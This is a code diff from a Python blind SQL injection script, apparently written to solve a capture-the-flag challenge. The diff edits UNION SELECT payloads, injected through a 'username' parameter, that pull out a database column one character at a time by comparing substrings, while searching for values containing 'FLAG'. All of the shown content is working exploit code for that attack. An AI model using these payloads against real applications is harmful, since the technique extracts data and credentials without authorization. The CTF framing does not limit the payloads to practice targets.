@@ -40,7 +40,7 @@ def find_col_has_flag():
     for table, cols in table_col.items():
         for col in cols:
             query = f'''' union select 1, 2, 3 from (select group_concat({col} separator ',') as res
-                          from Secure.{table} where Password like '%FLAG%')
+                          from Secure.{table} where {col} like '%FLAG%')
                           as q where binary substring(res, 1, 1) = 'F'#'''
             params = {"username": query}
             elapsed_time = time.monotonic() - last_req_time
@@ -82,7 +82,7 @@ def sqli_blind(query_type="DB", db_name=None, table_name=None, col_name=None):
                               and table_schema='{db_name}') as q where binary substring(res, {index}, 1) = '{char}'#'''
             elif query_type == "Flag":
                 query = f'''' union select 1, 2, 3 from (select group_concat({col_name} separator ',') as res
-                              from {db_name}.{table_name} where Password like '%FLAG%')
+                              from {db_name}.{table_name} where {col_name} like '%FLAG%')
                               as q where binary substring(res, {index}, 1) = '{char}'#'''
             params = {"username": query}
 
